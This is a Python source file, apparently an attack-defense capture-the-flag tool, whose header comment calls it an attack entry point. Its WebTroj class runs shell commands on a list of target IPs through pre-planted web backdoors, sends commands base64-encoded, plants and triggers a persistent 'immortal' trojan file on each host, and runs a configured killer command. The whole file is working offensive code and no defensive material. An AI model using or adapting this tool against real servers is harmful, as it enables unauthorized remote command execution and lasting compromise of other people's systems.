#攻击入口
import requests
import base64
import json
import os
from Tools.BackDoorDescription import *
import Setting
class WebTroj:
    i=0
    @property
    def useBckDoorIndex(self):
        return self.i
    @useBckDoorIndex.setter
    def useBckDoorIndex(self,v):
        self.i=v
    def __init__(self,seed,config):
        self.rawbackdoor_list=config['env']['rawbackdoor_list']
        with open(f'{Setting.Config.root}/{Setting.Config.defaultSettingPath}//{self.rawbackdoor_list}') as f:
            self.bds=json.load(f)
        print(self.bds)
        f.close()
        self.ips=config['env']['ips']
        self.webrootPath=config['self']['webrootPath']
        self.killer=config['troj']['killer']
        self.requestTimeout=config['requestTimeout']
        self.team=DescriptionList(self.ips,self.webrootPath,seed)
    def getBckPayload(self,cmd):
        return self.bds[self.i].payload.format(cmd)
    def getBckUrl(self,index):
        return 'http://{0}/{1}'.format(self.ips[index],self.bds[self.i].url)
    def getTeamPayload(self,index,cmd):
        tmp="{0};".format(cmd).encode("utf-8")
        tmp=base64.b64encode(tmp)
        return {"cmd":tmp.decode("utf-8")}
    def getTeamUrl(self,index):
        return 'http://{0}/{1}?{3}={2}'.format(self.ips[index],self.team[index].subTrojFilename,self.team[index].trojKey,self.team[index].subTrojectParam)
    def clearTroj(self,index):
        return self.runCmd(index,self.killer)
    def loadTroj(self,index):
        return self.runCmd(index,self.team[index].trojContent)
    def touchTroj(self,index):
        return self.requestServer(f'http://{self.ips[index]}/{self.team[index].immortalTrojFilename}','','get','','','')
    def trojTime(self,index):
        self.loadTroj(index)
        return self.touchTroj(index)
    def runCmd(self,index,cmd):
        tbd=self.bds[self.i]
        return self.requestServer(self.getBckUrl(index),self.getBckPayload(cmd),tbd.method,tbd.headers,tbd.resultStartPos,tbd.resultEndPos) 
    def runTeamCmd(self,index,cmd):
        payload=self.getTeamPayload(index,cmd)
        tbd=self.bds[self.i]
        return self.requestServer(self.getTeamUrl(index),payload,'post','','','') 
        
    def requestServer(self,url,payload,method,headers,resultStartPos,resultEndPos):
        #print(f"{url} -> {str(payload)}")
        try:
            fun=eval(f'requests.{method}')
            if method=='get':
                url+=('?') if not url.__contains__('?') else ''
                url+=payload
            response=fun(url=url,data=payload,timeout=self.requestTimeout,headers=headers)
        except Exception as e:
            print(e)
            return 'None'
        raw=response.text
        try:
            if len(raw)>0:
                rstart=0 if resultStartPos=='' else raw.index(resultStartPos)
            rend=len(raw) if resultEndPos=='' else raw.index(resultEndPos)
            raw=raw[rstart:rend]
        except:
            pass
        return raw